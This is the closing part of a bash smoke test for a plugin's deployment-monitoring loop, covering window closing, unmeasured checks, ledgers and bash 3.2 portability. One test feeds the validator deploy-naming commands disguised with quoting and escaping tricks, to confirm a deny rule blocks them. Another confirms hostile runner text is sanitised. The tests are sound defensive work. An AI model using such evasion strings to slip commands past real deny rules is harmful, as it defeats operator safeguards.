(cd "$OL" && "$OL_OPS" plans/ol-plan.md status >"$OL_TMP/status.out" 2>&1) || true
! grep -q '^## L-99' "$OL_TMP/status.out" && ! grep -q '`' "$OL_TMP/status.out" || fail "operate-loop: status printed the runner's hostile text unsanitised: $(cat "$OL_TMP/status.out")"
for m in nan extra missing string null twice exit objx objnote objnov; do
  echo "$m" >"$OL_TMP/runner.mode"
  olr "runner reply $m" 0 -- plans/ol-plan.md monitor
  [ "$(olq "$OL_CP" '(o["checks"]["r-run"]["last_value"], o["checks"]["r-run"]["last_status"])')" = "(None, 'unmeasured')" ] \
    || fail "operate-loop: requirement 3: the runner reply '$m' did not fail closed: $(olq "$OL_CP" 'o["checks"]["r-run"]')"
done
# F-018(b): r-run breached on run 1 and is unmeasured on every run since: status names it as still breaching
(cd "$OL" && "$OL_OPS" plans/ol-plan.md status >"$OL_TMP/status.out" 2>&1) || true
grep -q 'still breaching at their last measurement (unmeasured since): .*r-run' "$OL_TMP/status.out" \
  || fail "operate-loop: F-018: status does not show r-run as still breaching at its last measurement: $(cat "$OL_TMP/status.out")"
olr "PLAN ingest" 0 -- plans/ol-plan.md ingest
[ "$(olq "$OL_CP" 'len(o["pending"])')" = 0 ] && [ "$(grep -c '^## L-' "$OL_LES")" = 2 ] || fail "operate-loop: PLAN ingest left pending signals or re-filed"
echo good >"$OL_TMP/runner.mode"

# --- threat 4: ol's window moved past its end closes, with open-at-close, and is never measured again ------------------
python3 -c 'import datetime as d, json, sys; p = sys.argv[1]; s = json.load(open(p)); w = s["operate"]["window"]; f = "%Y-%m-%dT%H:%M:%SZ"; t = d.datetime.strptime(w["start"], f) - d.timedelta(days=8); w["start"], w["end"] = t.strftime(f), (t + d.timedelta(days=7)).strftime(f); json.dump(s, open(p, "w"))' "$OL_CP"
OL_LT="$(olq "$OL_CP" 'o["checks"]["c-high"]["last_ts"]')"; OL_NSIG="$(ls "$OL_ST/operate" | wc -l | tr -d ' ')"
sleep 1
olr "the closing run" 0 -- --all monitor --ingest; cp "$OL_TMP/run.out" "$OL_TMP/run3.out"
grep -q 'plan ol: watch window ended .*closed closed-with-breaches; open-at-close: .*c-high' "$OL_TMP/run3.out" || fail "operate-loop: threat 4: the ended window was not closed with open-at-close: $(cat "$OL_TMP/run3.out")"
[ "$(olq "$OL_CP" '(o["window"]["outcome"], "c-high" in o["window"]["open_at_close"], "h-status" in o["window"]["open_at_close"], o["checks"]["c-high"]["last_ts"], len(o["windows_closed"]))')" = "('closed-with-breaches', True, True, '$OL_LT', 1)" ] \
  || fail "operate-loop: threat 4: the window close is wrong, or the expired plan was measured again (mutants: no end check / open_at_close = []): $(olq "$OL_CP" 'o["window"]')"
# F-018(b): breach (run 1), then unmeasured (every run since), then close → r-run is open at close. Mutant
# "open_at_close = the last run's breaching list" turns this red.
# F-018(a) (operator decision: keep the two outcomes, fail closed): c-word, never measured in the window, is open at
# close and unmeasured at close; r-run, unmeasured on the last run, is unmeasured at close; c-slow, no longer declared,
# is neither. measured_runs = the window's runs that measured something (c-high measures on every run, so every signal
# file). Mutants "a never-measured check is not open" / "measured_runs = every run" / "unmeasured_at_close = never
# measured only" turn this red.
[ "$(olq "$OL_CP" '("r-run" in o["window"]["open_at_close"], "r-run" in o["window"]["breaching"], "c-word" in o["window"]["open_at_close"])')" = "(True, False, True)" ] \
  || fail "operate-loop: F-018: a check whose last measured status was breach, or a never-measured check, is missing from open_at_close: $(olq "$OL_CP" 'o["window"]')"
[ "$(olq "$OL_CP" '(o["window"]["unmeasured_at_close"], o["window"]["measured_runs"], o["windows_closed"][-1]["measured_runs"], o["windows_closed"][-1]["unmeasured_at_close"] == o["window"]["unmeasured_at_close"], "c-slow" in o["window"]["open_at_close"])')" \
  = "(['c-word', 'c-pipe', 'c-grep', 'h-lat', 'h-dead', 'r-run'], $OL_NSIG, $OL_NSIG, True, False)" ] \
  || fail "operate-loop: F-018(a): unmeasured_at_close / measured_runs ($OL_NSIG runs measured something) are wrong: $(olq "$OL_CP" 'o["window"]')"
case "$(python3 -c 'import json,sys; print([(r["outcome"], r["open_at_close"], r["breaches"] > 0, r["measured_runs"], r["unmeasured_at_close"]) for r in map(json.loads, open(sys.argv[1])) if r["event"] == "operate_window_closed"])' "$OL_ST/dispatch/ledger.jsonl")" in
  "[('closed-with-breaches', ["*"'c-high'"*"'c-word'"*"], True, $OL_NSIG, ['c-word', "*"'r-run'])]") ;; *) fail "operate-loop: threat 4 / F-018(a): no operate_window_closed row with open_at_close, measured_runs and unmeasured_at_close: $(cat "$OL_ST/dispatch/ledger.jsonl")" ;; esac
grep -q 'plan ol2: measured 1 check' "$OL_TMP/run3.out" || fail "operate-loop: the open plan ol2 was not measured beside the closing one"
olr "after the close" 0 -- --all monitor --ingest
grep -q 'plan ol: watch window closed (closed-with-breaches); not measured' "$OL_TMP/run.out" && [ "$(ls "$OL_ST/operate" | wc -l | tr -d ' ')" = "$OL_NSIG" ] \
  && [ "$(olq "$OL_CP" 'o["checks"]["c-high"]["last_ts"]')" = "$OL_LT" ] || fail "operate-loop: threat 4: a closed window was measured again: $(cat "$OL_TMP/run.out")"
(cd "$OL" && "$OL_OPS" plans/ol-plan.md status >"$OL_TMP/status.out" 2>&1) || true
grep -q 'window: closed (ended .*, closed-with-breaches, open-at-close: .*c-high' "$OL_TMP/status.out" || fail "operate-loop: status does not flag open-at-close: $(cat "$OL_TMP/status.out")"
# requirement 7: a redeploy keeps the closed window's outcome (windows_closed) and status shows it; a redeploy over an
# open window (ol2) closes it first (closed_by redeploy). Mutant "record overwrites operate.window" turns this red.
# F-018(a): ol2's plan gains c-new before its redeploy; never measured in the closing window, it is open at close
python3 "$OL_TMP/mkplan.py" "$OL/plans/ol2-plan.md" OL2 7 '[{"id": "c-high", "metric": "m2", "op": "<", "threshold": 5, "severity": "low", "probe": {"kind": "cmd", "command": "echo 9"}}, {"id": "c-new", "metric": "m3", "op": "<", "threshold": 5, "severity": "low", "probe": {"kind": "cmd", "command": "echo 1"}}]'
ol_ship ol "$OL_SHA"; ol_ship ol2 "$OL2_SHA"
[ "$(olq "$OL_CP" '(len(o["windows_closed"]), o["windows_closed"][-1]["outcome"], "outcome" in o["window"])')" = "(1, 'closed-with-breaches', False)" ] \
  && [ "$(olq "$OL2_CP" '(len(o["windows_closed"]), o["windows_closed"][-1]["outcome"], o["windows_closed"][-1]["closed_by"])')" = "(1, 'closed-with-breaches', 'redeploy')" ] \
  || fail "operate-loop: requirement 7: a redeploy erased a window's outcome: ol=$(olq "$OL_CP" 'o.get("windows_closed")') ol2=$(olq "$OL2_CP" 'o.get("windows_closed")')"
(cd "$OL" && "$OL_OPS" plans/ol-plan.md status >"$OL_TMP/status.out" 2>&1) || true
grep -q 'last closed window: closed-with-breaches' "$OL_TMP/status.out" || fail "operate-loop: requirement 7: status does not show the last closed window: $(cat "$OL_TMP/status.out")"
grep -q "last closed window: closed-with-breaches .*unmeasured-at-close: c-word, .*measured runs: $OL_NSIG;" "$OL_TMP/status.out" \
  || fail "operate-loop: F-018(a): status does not print the closed window's unmeasured-at-close and measured runs: $(cat "$OL_TMP/status.out")"
# F-018(a) on the redeploy close (record reads the plan's declared checks): c-high, measured on every run, is open as
# a breach; c-new, declared just before the redeploy and never measured, is open and unmeasured at close. Mutant "the
# redeploy close gets no declared checks" turns this red.
[ "$(olq "$OL2_CP" '(o["windows_closed"][-1]["unmeasured_at_close"], o["windows_closed"][-1]["measured_runs"] > 0, o["windows_closed"][-1]["open_at_close"])')" = "(['c-new'], True, ['c-high', 'c-new'])" ] \
  || fail "operate-loop: F-018(a): the redeploy close lacks unmeasured_at_close / measured_runs: $(olq "$OL2_CP" 'o["windows_closed"]')"
# F-018(a): three more landed plans (fabricated state, each with its own dispatch/ ledger), closed by --all monitor:
# fz-dead — one http check against a dead port, measured (unmeasured) once in its window, then moved past its end;
# fz-norun — its window ended before any monitor run; fz-clean — one cmd check measured ok, then moved past its end.
# A never-measured window is not operated-clean: fz-dead and fz-norun close closed-with-breaches with every check open
# and unmeasured at close and measured_runs 0, and status says so; fz-clean closes operated-clean with nothing open.
# Mutant "outcome from the breach count only" turns fz-dead / fz-norun red; "every window closed-with-breaches" fz-clean.
python3 - "$OL_TMP" "$OL_BASE" "$OL_DEAD_PORT" <<'PY' || fail "operate-loop: cannot fabricate the F-018(a) plans"
import datetime, json, os, sys
tmp, base, dead = sys.argv[1:4]
f = "%Y-%m-%dT%H:%M:%SZ"; t = datetime.datetime.utcnow()
plans = {"fa0000000001": ("fz-dead", [{"id": "h-gone", "metric": "m_gone", "op": "==", "threshold": 200, "severity": "high", "probe": {"kind": "http", "url": "http://127.0.0.1:%s/ok" % dead, "measure": "status"}}], 3),
         "fa0000000002": ("fz-norun", [{"id": "n-one", "metric": "n1", "op": "<", "threshold": 5, "severity": "low", "probe": {"kind": "cmd", "command": "echo 1"}},
                                      {"id": "n-two", "metric": "n2", "op": "<", "threshold": 5, "severity": "low", "probe": {"kind": "cmd", "command": "echo 2"}}], -1),
         "fa0000000003": ("fz-clean", [{"id": "k-ok", "metric": "k_ok", "op": "<", "threshold": 5, "severity": "low", "probe": {"kind": "cmd", "command": "echo 1"}}], 3)}
for d, (slug, checks, end) in plans.items():
    p = os.path.join(tmp, slug + "-plan.md")
    open(p, "w").write("# %s\n\n## Monitor\n\n```json\n%s\n```\n" % (slug, json.dumps({"checks": checks, "window_days": 3})))
    sd = os.path.join(base, d); os.makedirs(os.path.join(sd, "dispatch"))
    start = t - datetime.timedelta(days=4 if end < 0 else 0)
    json.dump({"landed": True, "plan_path": p, "operate": {"window": {"start": start.strftime(f), "end": (t + datetime.timedelta(days=end)).strftime(f), "days": 3}}},
              open(os.path.join(sd, "checkpoint.json"), "w"))
PY
OL_FZD="$OL_BASE/fa0000000001"; OL_FZN="$OL_BASE/fa0000000002"; OL_FZC="$OL_BASE/fa0000000003"
olr "F-018(a) run A" 0 -- --all monitor; cp "$OL_TMP/run.out" "$OL_TMP/runA.out"
grep -q 'plan fz-dead: measured 1 check' "$OL_TMP/runA.out" && grep -q 'plan fz-clean: measured 1 check' "$OL_TMP/runA.out" \
  && grep -qF 'closed closed-with-breaches; open-at-close: n-one, n-two; unmeasured-at-close: n-one, n-two; 0 measured run(s) (never measured)' "$OL_TMP/runA.out" \
  || fail "operate-loop: F-018(a): run A did not measure fz-dead / fz-clean or close the never-run fz-norun closed-with-breaches: $(cat "$OL_TMP/runA.out")"
[ "$(olq "$OL_FZD/checkpoint.json" '(o["checks"]["h-gone"]["last_status"], o["window"]["measured_runs"], o["window"]["last_unmeasured"])')" = "('unmeasured', 0, ['h-gone'])" ] \
  || fail "operate-loop: F-018(a): the dead-port check was not unmeasured with measured_runs 0: $(olq "$OL_FZD/checkpoint.json" 'o')"
for OL_FZ in "$OL_FZD" "$OL_FZC"; do
  python3 -c 'import datetime as d, json, sys; p = sys.argv[1]; s = json.load(open(p)); w = s["operate"]["window"]; f = "%Y-%m-%dT%H:%M:%SZ"; t = d.datetime.strptime(w["start"], f) - d.timedelta(days=4); w["start"], w["end"] = t.strftime(f), (t + d.timedelta(days=3)).strftime(f); json.dump(s, open(p, "w"))' "$OL_FZ/checkpoint.json"
done
olr "F-018(a) run B" 0 -- --all monitor; cp "$OL_TMP/run.out" "$OL_TMP/runB.out"
[ "$(olq "$OL_FZD/checkpoint.json" '(o["window"]["outcome"], o["window"]["open_at_close"], o["window"]["unmeasured_at_close"], o["window"]["measured_runs"], o["windows_closed"][-1]["measured_runs"], o["windows_closed"][-1]["unmeasured_at_close"])')" \
  = "('closed-with-breaches', ['h-gone'], ['h-gone'], 0, 0, ['h-gone'])" ] \
  || fail "operate-loop: F-018(a): a window whose every run was unmeasured closed clean or without the check open (mutant: outcome from the breach count only): $(olq "$OL_FZD/checkpoint.json" 'o["window"]')"
[ "$(olq "$OL_FZN/checkpoint.json" '(o["window"]["outcome"], o["window"]["open_at_close"], o["window"]["unmeasured_at_close"], o["window"]["measured_runs"], o["window"]["breaches"])')" \
  = "('closed-with-breaches', ['n-one', 'n-two'], ['n-one', 'n-two'], 0, 0)" ] \
  || fail "operate-loop: F-018(a): a window with no monitor run closed clean or without its checks open: $(olq "$OL_FZN/checkpoint.json" 'o["window"]')"
[ "$(olq "$OL_FZC/checkpoint.json" '(o["window"]["outcome"], o["window"]["open_at_close"], o["window"]["unmeasured_at_close"], o["window"]["measured_runs"])')" = "('operated-clean', [], [], 1)" ] \
  || fail "operate-loop: F-018(a): a window whose every check was measured ok did not close operated-clean (mutant: every window closed-with-breaches): $(olq "$OL_FZC/checkpoint.json" 'o["window"]')"
OL_FZR="$(for OL_FZ in "$OL_FZD" "$OL_FZN" "$OL_FZC"; do python3 -c 'import json,sys; print([(r["slug"], r["outcome"], r["open_at_close"], r["measured_runs"], r["unmeasured_at_close"]) for r in map(json.loads, open(sys.argv[1])) if r["event"] == "operate_window_closed"])' "$OL_FZ/dispatch/ledger.jsonl"; done)"
[ "$OL_FZR" = "[('fz-dead', 'closed-with-breaches', ['h-gone'], 0, ['h-gone'])]
[('fz-norun', 'closed-with-breaches', ['n-one', 'n-two'], 0, ['n-one', 'n-two'])]
[('fz-clean', 'operated-clean', [], 1, [])]" ] || fail "operate-loop: F-018(a): the operate_window_closed rows lack measured_runs / unmeasured_at_close: $OL_FZR"
for OL_FZ in "$OL_FZD" "$OL_FZN" "$OL_FZC"; do
  OL_V="$("$LG" verify --state "$OL_FZ" 2>&1)" || fail "operate-loop: F-018(a): ledger.sh verify failed for $OL_FZ: $OL_V"
done
(cd "$OL" && "$OL_OPS" --all status >"$OL_TMP/status.out" 2>&1) || true
awk '/^plan fz-dead /,/^$/' "$OL_TMP/status.out" | grep -q 'WARNING: fz-dead was never measured in this window (0 measured runs)' \
  && awk '/^plan fz-dead /,/^$/' "$OL_TMP/status.out" | grep -qF 'closed-with-breaches, open-at-close: h-gone, unmeasured-at-close: h-gone, measured runs: 0)' \
  && awk '/^plan fz-norun /,/^$/' "$OL_TMP/status.out" | grep -q 'WARNING: fz-norun was never measured in this window' \
  && ! awk '/^plan fz-clean /,/^$/' "$OL_TMP/status.out" | grep -q 'never measured' \
  || fail "operate-loop: F-018(a): status does not say plainly that a closed window was never measured: $(cat "$OL_TMP/status.out")"
rm -rf "$OL_FZD" "$OL_FZN" "$OL_FZC" "$OL_TMP"/fz-*-plan.md
# requirement 2: monitorlib refuses a cmd probe naming operate.sh, deploy or APEX_DEPLOY_CMD (any case), by name.
# Mutant "no deny pattern in _probe" turns this red; a neighbour without the words still validates.
for c in "sh $OL_OPS x status" "make DEPLOY" "echo \$apex_deploy_cmd" "./Operate.SH status" 'make de""ploy' 'make de\ploy' "./oper'a'te.sh x"; do
  python3 "$OL_TMP/mkplan.py" "$OL_TMP/deny-plan.md" D 7 "$(python3 -c 'import json,sys; print(json.dumps([{"id": "d", "metric": "d", "op": "<", "threshold": 1, "severity": "low", "probe": {"kind": "cmd", "command": sys.argv[1]}}]))' "$c")"
  OL_V="$(python3 "$EX/monitorlib.py" validate "$OL_TMP/deny-plan.md" 2>&1)" && fail "operate-loop: requirement 2: a cmd probe '$c' was accepted"
  case "$OL_V" in *"must not name operate.sh, the word deploy or APEX_DEPLOY_CMD"*) ;; *) fail "operate-loop: requirement 2: '$c' was not refused by name: $OL_V" ;; esac
done
python3 "$OL_TMP/mkplan.py" "$OL_TMP/deny-plan.md" D 7 '[{"id": "d", "metric": "d", "op": "<", "threshold": 1, "severity": "low", "probe": {"kind": "cmd", "command": "make status-check"}}]'
python3 "$EX/monitorlib.py" validate "$OL_TMP/deny-plan.md" >/dev/null || fail "operate-loop: requirement 2: a harmless cmd probe was refused"
# requirement 6: at most 50 checks per plan, refused by name
python3 "$OL_TMP/mkplan.py" "$OL_TMP/deny-plan.md" D 7 "$(python3 -c 'import json; print(json.dumps([{"id": "k%d" % i, "metric": "k", "op": "<", "threshold": 1, "severity": "low", "probe": {"kind": "cmd", "command": "echo 1"}} for i in range(51)]))')"
OL_V="$(python3 "$EX/monitorlib.py" validate "$OL_TMP/deny-plan.md" 2>&1)" && fail "operate-loop: requirement 6: a 51-check plan was accepted"
case "$OL_V" in *"at most 50 checks"*) ;; *) fail "operate-loop: requirement 6: the 51-check plan was not refused by name: $OL_V" ;; esac
# backlog.sh: line 0 needs --from operate
(cd "$OL" && "$EX/backlog.sh" plans/ol-plan.md add 0 "x" >"$OL_TMP/bl.out" 2>&1) && fail "operate-loop: backlog.sh accepted line 0 without --from operate"
grep -q 'needs --from operate' "$OL_TMP/bl.out" || fail "operate-loop: backlog.sh line 0 refusal is not named: $(cat "$OL_TMP/bl.out")"
# the ledger chains verify (ol, ol2, the repo state)
for d in "$OL_ST" "$OL2_ST" "$OL_RD"; do
  OL_V="$("$LG" verify --state "$d" 2>&1)" || fail "operate-loop: ledger.sh verify failed for $d: $OL_V"
done
[ ! -d "$OL_NM_ST/operate" ] || fail "operate-loop: the plan with no Monitor section was measured"
{ kill "$OL_PID"; wait "$OL_PID"; } >/dev/null 2>&1 || true; OL_PID=""
ok "operate-loop: --all monitor --ingest measures http (stub on 127.0.0.1), cmd and runner checks only in open windows; run twice it files each high breach once as a lesson tagged operate:{slug},{metric} and counts the repeat, files the low breach as a plan-level backlog item, and files the repo-level breach only under operate:repo; a timed-out probe, a non-number, a failed GET, an expect_status mismatch and every malformed runner reply are unmeasured (null, never 0 or a pass); every signal and ledger row carries its plan's slug (ol2's same-id check credited to ol2) or repo; a window past its end closes closed-with-breaches with open-at-close (a check never measured in the window is open at close), writes operate_window_closed with measured_runs and unmeasured_at_close and is not measured again; a window never measured (every run unmeasured, or no run) closes closed-with-breaches and status says it was never measured, and one measured ok closes operated-clean; a redeploy keeps windows_closed; the no-Monitor plan is skipped and warned; cmd probes run verbatim under sh -c in the repo root without APEX_*; deploy-naming probes and 51-check plans are refused; the 200-check run cap and APEX_MONITOR_CMD are enforced before any probe; hostile runner text is sanitised; --all walks in one python pass; the ledgers verify"

# bash 3.2 (macOS's /bin/bash): with set -u an empty array expansion is "unbound". Every array
# expansion in a set -u script must be guarded (${A[@]+"${A[@]}"}), follow a ${#A[@]} test in the
# lines just above, or name an array that is never empty.
python3 - "$PLUGIN_ROOT" <<'PY' || fail "an unguarded array expansion would crash under macOS bash 3.2 with set -u"
import glob, os, re, sys
ALWAYS = {"GIT", "DIFF_OPTS", "PATHSPEC", "STEPS", "ARGS"}
bad = []
for f in sorted(glob.glob(os.path.join(sys.argv[1], "skills", "*", "scripts", "*.sh"))):
    L = open(f).read().splitlines()
    if not any(re.match(r"\s*set -[a-z]*u", l) for l in L):
        continue
    for i, l in enumerate(L):
        for m in re.finditer(r'"\$\{([A-Za-z_]\w*)\[[@*]\]\}"|\$\{([A-Za-z_]\w*)\[\*\]\}|"\$\{!([A-Za-z_]\w*)\[@\]\}"', l):
            n = m.group(1) or m.group(2) or m.group(3)
            if n in ALWAYS or ("${%s[@]+" % n) in l or ("#%s[@]" % n) in "\n".join(L[max(0, i - 5):i + 1]):
                continue
            bad.append("%s:%d %s" % (os.path.relpath(f, sys.argv[1]), i + 1, n))
if bad:
    print("\n".join(bad), file=sys.stderr)
    sys.exit(1)
PY
ok "bash 3.2: every array expansion in a set -u script is guarded, follows a length test, or names a never-empty array"

# bash 3.2 cannot parse a heredoc inside $( ) whose body has an odd count of ' or ` (checkpoint.sh did not parse on macOS).
python3 - "$PLUGIN_ROOT" <<'PY' || fail "a heredoc inside \$( ) has an odd count of ' or \` (bash 3.2 cannot parse it)"
import glob, os, re, sys
bad = []
for f in sorted(glob.glob(os.path.join(sys.argv[1], "**", "*.sh"), recursive=True)):
    L = open(f, encoding="utf-8").read().split("\n")
    i = 0
    while i < len(L):
        m = re.search(r"<<-?\s*['\"]?(\w+)['\"]?\s*$", L[i])
        if m and "$(" in L[i]:
            j = i + 1
            while j < len(L) and L[j].strip() != m.group(1):
                j += 1
            body = "\n".join(L[i + 1:j])
            if body.count("'") % 2 or body.count("`") % 2:
                bad.append("%s:%d" % (os.path.relpath(f, sys.argv[1]), i + 1))
            i = j
        i += 1
if bad:
    print("\n".join(bad), file=sys.stderr)
    sys.exit(1)
PY
# Siblings resolve to the highest installed version, never the first glob match; iterate.md passes only the plan path.
SC="$(mktemp -d)"; mkdir -p "$SC/mk/apex-scope-loop/0.4.4/skills/apex-execute"
for v in 0.1.0 0.6.0 0.10.0 0.9.9; do mkdir -p "$SC/mk/apex-dispatch/$v/.claude-plugin" "$SC/mk/apex-dispatch/$v/scripts"; printf '{"version": "%s"}\n' "$v" >"$SC/mk/apex-dispatch/$v/.claude-plugin/plugin.json"; printf '#!/bin/sh\n' >"$SC/mk/apex-dispatch/$v/scripts/route.sh"; chmod +x "$SC/mk/apex-dispatch/$v/scripts/route.sh"; done
GOT="$(APEX_SCOPE_LOOP_PLUGIN_ROOT="$SC/mk/apex-scope-loop/0.4.4" bash -c 'source "$1"; APEX_SCOPE_LOOP_PLUGIN_ROOT="$2"; apex_dispatch_root' _ "$PLUGIN_ROOT/skills/apex-execute/scripts/_lib.sh" "$SC/mk/apex-scope-loop/0.4.4")"
[ "$GOT" = "$(cd "$SC/mk/apex-dispatch/0.10.0" && pwd -P)" ] || fail "apex_dispatch_root did not pick the highest cached version (0.10.0): $GOT"
rm -rf "$SC"
! grep -qF 'DROOT="${APEX_DECISION_LAYER_ROOT:-$(cd' "$PLUGIN_ROOT/skills/apex-execute/scripts/risk-tier.sh" && grep -qF 'apex_sibling_root apex-decision-layer' "$PLUGIN_ROOT/skills/apex-execute/scripts/risk-tier.sh" \
  || fail "risk-tier.sh does not find the decision layer through apex_sibling_root"
! grep -qE '\$S/[a-z-]+\.sh \$ARGUMENTS' "$PLUGIN_ROOT/commands/iterate.md" && grep -qF '**The plan path.**' "$PLUGIN_ROOT/commands/iterate.md" \
  || fail "commands/iterate.md still passes \$ARGUMENTS to a script"
grep -qF 'verdict_trace' "$PLUGIN_ROOT/skills/apex-execute/scripts/checkpoint.sh" || fail "checkpoint.sh does not print the verdict trace of a refused record"
ok "bash 3.2 heredocs balanced; siblings by highest installed version (apex_dispatch_root, decision layer); iterate.md passes only the plan path; refused records print their verdict trace"

echo ""
echo "smoke passed: 73/73 checks"
